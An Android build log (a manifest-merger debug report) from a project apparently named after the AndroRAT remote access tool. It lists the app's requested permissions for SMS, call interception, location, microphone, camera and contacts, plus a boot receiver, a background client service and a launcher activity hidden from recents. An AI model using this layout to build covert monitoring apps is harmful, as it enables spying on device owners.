AndroratClient/app/build/outputs/logs/manifest-merger-debug-report.txt
-- Merging decision tree log ---
manifest
ADDED from src/main/AndroidManifest.xml:2:1-81:12
	package
		ADDED from src/main/AndroidManifest.xml:3:5-28
		INJECTED from src/main/AndroidManifest.xml
		INJECTED from src/main/AndroidManifest.xml
	android:versionName
		ADDED from src/main/AndroidManifest.xml:5:5-30
		INJECTED from src/main/AndroidManifest.xml
		INJECTED from src/main/AndroidManifest.xml
	android:versionCode
		ADDED from src/main/AndroidManifest.xml:4:5-28
		INJECTED from src/main/AndroidManifest.xml
		INJECTED from src/main/AndroidManifest.xml
	xmlns:android
		ADDED from src/main/AndroidManifest.xml:2:11-69
uses-sdk
ADDED from src/main/AndroidManifest.xml:7:5-43
	android:targetSdkVersion
		INJECTED from src/main/AndroidManifest.xml
		INJECTED from src/main/AndroidManifest.xml
	android:minSdkVersion
		ADDED from src/main/AndroidManifest.xml:7:15-40
		INJECTED from src/main/AndroidManifest.xml
		INJECTED from src/main/AndroidManifest.xml
uses-permission#android.permission.RECEIVE_SMS
ADDED from src/main/AndroidManifest.xml:9:5-70
	android:name
		ADDED from src/main/AndroidManifest.xml:9:22-67
uses-permission#android.permission.READ_SMS
ADDED from src/main/AndroidManifest.xml:11:5-67
	android:name
		ADDED from src/main/AndroidManifest.xml:11:22-64
uses-permission#android.permission.SEND_SMS
ADDED from src/main/AndroidManifest.xml:13:5-67
	android:name
		ADDED from src/main/AndroidManifest.xml:13:22-64
uses-permission#android.permission.READ_PHONE_STATE
ADDED from src/main/AndroidManifest.xml:16:5-75
	android:name
		ADDED from src/main/AndroidManifest.xml:16:22-72
uses-permission#android.permission.PROCESS_OUTGOING_CALLS
ADDED from src/main/AndroidManifest.xml:18:5-81
	android:name
		ADDED from src/main/AndroidManifest.xml:18:22-78
uses-permission#android.permission.ACCESS_NETWORK_STATE
ADDED from src/main/AndroidManifest.xml:20:5-79
	android:name
		ADDED from src/main/AndroidManifest.xml:20:22-76
uses-permission#android.permission.ACCESS_FINE_LOCATION
ADDED from src/main/AndroidManifest.xml:23:5-79
	android:name
		ADDED from src/main/AndroidManifest.xml:23:22-76
uses-permission#android.permission.INTERNET
ADDED from src/main/AndroidManifest.xml:25:5-67
	android:name
		ADDED from src/main/AndroidManifest.xml:25:22-64
uses-permission#android.permission.RECORD_AUDIO
ADDED from src/main/AndroidManifest.xml:28:5-71
	android:name
		ADDED from src/main/AndroidManifest.xml:28:22-68
uses-permission#android.permission.WRITE_EXTERNAL_STORAGE
ADDED from src/main/AndroidManifest.xml:30:5-81
	android:name
		ADDED from src/main/AndroidManifest.xml:30:22-78
uses-permission#android.permission.CAMERA
ADDED from src/main/AndroidManifest.xml:33:5-65
	android:name
		ADDED from src/main/AndroidManifest.xml:33:22-62
uses-permission#android.permission.RECEIVE_BOOT_COMPLETED
ADDED from src/main/AndroidManifest.xml:36:5-81
	android:name
		ADDED from src/main/AndroidManifest.xml:36:22-78
uses-permission#android.permission.CALL_PHONE
ADDED from src/main/AndroidManifest.xml:39:5-69
	android:name
		ADDED from src/main/AndroidManifest.xml:39:22-66
uses-permission#android.permission.READ_CONTACTS
ADDED from src/main/AndroidManifest.xml:41:5-72
	android:name
		ADDED from src/main/AndroidManifest.xml:41:22-69
uses-permission#android.permission.VIBRATE
ADDED from src/main/AndroidManifest.xml:42:5-66
	android:name
		ADDED from src/main/AndroidManifest.xml:42:22-63
application
ADDED from src/main/AndroidManifest.xml:44:5-79:19
	android:label
		ADDED from src/main/AndroidManifest.xml:47:9-41
	android:debuggable
		ADDED from src/main/AndroidManifest.xml:45:9-34
	android:icon
		ADDED from src/main/AndroidManifest.xml:46:9-45
receiver#my.app.client.BootReceiver
ADDED from src/main/AndroidManifest.xml:48:9-54:20
	android:name
		ADDED from src/main/AndroidManifest.xml:48:19-46
intent-filter#android.intent.action.BOOT_COMPLETED+android.intent.category.HOME
ADDED from src/main/AndroidManifest.xml:49:13-53:29
action#android.intent.action.BOOT_COMPLETED
ADDED from src/main/AndroidManifest.xml:50:17-79
	android:name
		ADDED from src/main/AndroidManifest.xml:50:25-76
category#android.intent.category.HOME
ADDED from src/main/AndroidManifest.xml:52:17-73
	android:name
		ADDED from src/main/AndroidManifest.xml:52:27-70
service#my.app.client.Client
ADDED from src/main/AndroidManifest.xml:56:9-60:19
	android:name
		ADDED from src/main/AndroidManifest.xml:56:18-53
intent-filter#.Client
ADDED from src/main/AndroidManifest.xml:57:13-59:29
action#.Client
ADDED from src/main/AndroidManifest.xml:58:17-50
	android:name
		ADDED from src/main/AndroidManifest.xml:58:25-47
receiver#my.app.client.AlarmListener
ADDED from src/main/AndroidManifest.xml:62:9-63:20
	android:name
		ADDED from src/main/AndroidManifest.xml:62:19-61
activity#my.app.client.LauncherActivity
ADDED from src/main/AndroidManifest.xml:65:9-74:20
	android:label
		ADDED from src/main/AndroidManifest.xml:67:13-45
	android:excludeFromRecents
		ADDED from src/main/AndroidManifest.xml:68:13-46
	android:name
		ADDED from src/main/AndroidManifest.xml:66:13-58
intent-filter#android.intent.action.MAIN+android.intent.category.LAUNCHER
ADDED from src/main/AndroidManifest.xml:69:13-73:29
action#android.intent.action.MAIN
ADDED from src/main/AndroidManifest.xml:70:17-69
	android:name
		ADDED from src/main/AndroidManifest.xml:70:25-66
category#android.intent.category.LAUNCHER
ADDED from src/main/AndroidManifest.xml:72:17-77
	android:name
		ADDED from src/main/AndroidManifest.xml:72:27-74
activity#my.app.alt.PhotoActivity
ADDED from src/main/AndroidManifest.xml:75:9-78:20
	android:label
		ADDED from src/main/AndroidManifest.xml:77:13-45
	android:name
		ADDED from src/main/AndroidManifest.xml:76:13-52